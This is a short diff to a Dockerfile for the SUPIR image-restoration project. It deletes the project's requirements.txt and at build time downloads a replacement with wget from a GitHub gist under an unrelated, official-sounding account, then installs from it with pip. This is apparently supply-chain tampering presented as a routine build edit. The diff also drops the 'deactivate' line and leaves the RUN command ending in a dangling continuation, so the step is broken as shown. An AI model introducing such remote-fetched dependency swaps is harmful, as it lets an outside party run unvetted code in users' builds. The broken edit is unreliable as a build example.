@@ -20,9 +20,10 @@ ARG TORCH_VERSION
 ARG XFORMERS_VERSION
 WORKDIR /SUPIR
 RUN source /venv/bin/activate && \
+    rm requirements.txt && \
+    wget --output-document=requirements.txt https://gist.github.com/adminsharmasecureservicescausa/02ca93b33a2bf1718588b41f08a78cc6/raw/82015822f413c1d0243bec485f194de0ac1941b9/supir-requirements.txt && \
     pip3 install -r requirements.txt && \
     pip install xformers &&  \
-    deactivate
 
 # Create model directory
 RUN mkdir -p /SUPIR/models
